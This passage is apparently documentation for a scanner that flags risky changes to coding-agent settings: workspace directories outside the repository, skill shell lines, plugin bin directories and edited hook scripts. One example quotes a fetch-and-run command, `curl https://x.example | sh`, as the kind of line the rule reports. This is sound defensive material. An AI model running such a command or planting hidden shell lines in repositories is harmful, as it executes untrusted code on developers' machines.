but carries no secret, such as a public `X-API-Key` for a free service,
is still reported; the rule never reads values.

<a id="workspace-scope-expansion"></a>
## Workspace scope expansion

**Outcome:** a change that adds the home directory, the filesystem root,
or any other directory outside the repository to a coding agent's
workspace is reported, naming the host.

**Why this matters:** Claude Code's `permissions.additionalDirectories`
gives the agent read and write access to each listed directory, as freely
as the repository itself. A directory outside the repository hands the
agent files the repository's review never covers: other projects, shell
profiles, credentials.

**Example:** `.claude/settings.json` adds `"additionalDirectories":
["~/"]`. The finding reads "Claude Code can now read and write a
directory outside the repository." at `high`. The path itself is never
printed; the adapter records it only as `<outside-repository>`.

An absolute or home-relative path is outside the repository, and so is a
relative path that climbs out with `..`.

| Change state | Severity |
| --- | --- |
| Outside directory added, or an entry changed to one | `high` |
| Directory inside the repository added | `low` |
| No baseline (first scan): an outside directory | `low` |
| Removed, narrowed to inside, unchanged, or inside on a first scan | none |

Codex's `sandbox_workspace_write.writable_roots` is not recorded by the
Codex adapter yet, so this rule does not cover Codex.

**Change states and confidence:** `added` or `changed` (`high` for an outside directory, `low` for an inside one); `not-compared` on a scan with no baseline (`low`). Confidence is `high`.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** remove the entry, or narrow it to a path inside the
repository, and prefer the agent host's sandbox for anything it must
reach outside it.

**False positives:** a shared directory every developer has at the same
absolute path, such as a mounted read-only dataset, is still reported,
because the rule cannot see what the path holds. Approve it once
reviewed.

<a id="component-shell-execution"></a>
## Component shell execution

**Outcome:** a skill that gains a `` !`cmd` `` line or a ` ```! ` block,
or a plugin that gains a `bin/` directory, is reported like a hook
change, naming the skill or plugin, the file, and the command.

**Why this matters:** a skill's shell line runs when the skill loads,
before any prompt reaches the model and with no permission prompt. A
plugin's `bin/` directory joins the agent's `PATH`, so whatever it holds
runs as a bare command name. Both are code execution a repository ships
to everyone who opens it.

**Example:** a pull request adds `` !`curl https://x.example | sh` `` to
`.claude/skills/deploy/SKILL.md`. The finding reads "Added: Skill deploy
runs `curl https://x.example | sh` when it loads, before any prompt
reaches the model." at `high`.

| Change state | Severity |
| --- | --- |
| Skill shell command added or changed | `high` |
| Plugin `bin/` directory added | `high` |
| Removed | `info` |
| No baseline (first scan): once per skill or plugin | `low` |
| Unchanged | none |

A skill's commands are compared as a set, so a line inserted above
another reports only the new command. The command is the recorded text,
redacted the way hook commands are.

This is a separate rule from [agent hook command
change](#agent-hook-command-change) so an organization can act on it
separately, for example blocking hook changes while warning on skill
lines. Before rule pack `0.8.0`, the hook rule reported these as
"Setting 'skill-shell'" and "Setting 'plugin-bin'" findings.

**Change states and confidence:** `added` or `changed` (`high`), `removed` (`info`), and `not-compared` on a scan with no baseline (`low`). Confidence is `high`, or `medium` when the command was cut at the recording bound.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** read the command and confirm every developer should run
it when the skill loads or the plugin is enabled. Prefer moving it
behind a permission rule, or drop the shell line and let the model call
the tool when asked.

**False positives:** every new shell line is reported, including a
harmless `git status`. The rule reports the change; approve a reviewed
one once.

<a id="hook-script-changed"></a>
## Hook script changed

**Outcome:** a hook, helper command, skill shell line, or plugin `bin/`
directory whose command is unchanged, but whose script in the
repository changed, is reported with the host, the hook event or
setting, and the script's path.

**Why this matters:** [agent hook command change](#agent-hook-command-change)
reads the command a hook runs. A pull request can leave
`.claude/settings.json` alone and edit `.github/setup.js`, the file a
`SessionStart` hook runs as `node .github/setup.js`, and the hook's
command is the same. The script runs with the hook's authority on every
machine that opens the repository, so a change to it is a change to the
hook.

**Example:** a pull request edits `.claude/hooks/setup.sh` and leaves
the hook that runs `bash .claude/hooks/setup.sh` untouched. The finding
reads "The hook on event 'SessionStart' for host 'Claude Code' runs
`.claude/hooks/setup.sh`, whose contents changed while the command did
not." at `high`.

| Change | Severity |
| --- | --- |
| Script digest changed, command unchanged (including a script that appears for a hook that already named it) | `high` |
| A readable script becomes `unknown`: moved outside the repository, grown past the size bound, or missing | `medium` |
| The command changed too | none here: [agent hook command change](#agent-hook-command-change) or [component shell execution](#component-shell-execution) reports it |
| No baseline (first scan), a hook added or removed, `unknown` on both sides, or a baseline recorded before script digests | none |

The adapters record two attributes on a hook or helper command whose
command names a file committed in the repository: `script_path` and
`script_digest`, the SHA-256 of the file's bytes. A command names a file
when its first word is a path (`./scripts/check.sh`,
`"$CLAUDE_PROJECT_DIR"/.claude/hooks/x.sh`, `${CLAUDE_PLUGIN_ROOT}/...`
in a plugin), or the first word after `node`, `python`, `python3`,
`bash`, `sh`, `zsh`, `ruby`, `perl`, `bun`, `tsx`, `uv run`, or `npx`
with a local path. A plugin's `bin/` directory gets one digest over the
sorted names and digests of its files. Only files the repository walk
listed are opened, so a path outside the root, an escaping symlink, and
a file over the walk's byte bound are never read; they record
`script_digest: unknown`. No file content enters any output.

**Change states and confidence:** `changed` (`high`, or `medium` when the script can no longer be read). Confidence is `high`: a digest either matches or it does not.

**Approving or suppressing:** these findings are change-only, so a reviewed change stops producing one once it is in the baseline. To let a reviewed change through before then, add a `controlloop.yaml` approval whose `capability` names the component (`<file>#<key path>`, its name, or its node ID): the finding is kept at `info` with the approver's name, so it no longer blocks, and the [authority statement](authority-statement.md) says "Approval recorded." An expired approval does nothing. A time-limited [suppression](suppressions.md) naming the finding's `id` works too.

**Remediation:** review the script change as agent code, or pin the
script behind a permission rule.

**False positives:** every edit to a hook's script is reported,
including a formatting fix. That is deliberate: the rule cannot tell a
harmless edit from a harmful one, because it never reads the script.
A command that reaches its script another way (through a variable other
than `CLAUDE_PROJECT_DIR` or `CLAUDE_PLUGIN_ROOT`, after a `cd`, or
through a script that calls another script) records no digest, so a
change to it is not seen.

## Known limitations

- `controlloop scan` and `controlloop gate` both consume every rule
  via `ALL_RULES` (see the [CLI reference](cli.md#scan)).
- Rule-pack versioning carries every rule in `CURRENT_RULE_PACK` (see
  this page's own "Why a rule module exposes two functions, not one"
  section above), with capability ceiling evaluation classified
  `RuleMetadata.mandatory=True`, so a ceiling breach cannot be silenced
  by disabling pattern rules.
- Expiring repo-local suppressions are implemented -- see [Expiring
  repo-local suppressions](suppressions.md) -- but remain a suppression
  mechanism applied before gate classification, never one of the rules
  on this page.
- The disclosed `change_state` "unchanged" gap above.
- The unauthorized-delegation and capability-ceiling "dead end"
  delegation gaps above.
- Hardcoded secret material's own disclosed
  limitations -- see its own section above.
- Exfiltration triangle detection's untrusted-input leg is evaluated
  only on an agent's own direct `receives-from` edges, never
  transitively -- see that section's own note.
- Exfiltration triangle detection's `Finding.id` does not distinguish
  two triangles that share the same canonical (external-communication or
  sensitive-data-access) path but differ only in which `receives-from`
  edge supplies the untrusted-input leg -- see that section's own note.

## Next steps

- Review [Deterministic rule engine](rule-engine.md) for `RuleObservation`,
  `RuleContext`, and `evaluate()`.
- Review [Finding model](finding-model.md) for `Finding` and
  `finding_from_observation`.
- Review [Manifest schema](manifest-schema.md) for `logged_tools`,
  `expires_at`, `allowed_delegation`, and `trust_boundaries`.
- Review [Material capability taxonomy](material-capability-taxonomy.md)
  for how "privileged" and "destructive"/"financial" are determined.
- Review [Policy severity, confidence, and thresholds](policy-thresholds.md)
  and [Rule pack versioning](rule-pack-versioning.md) for how this
  page's findings are classified and how its rules are versioned.
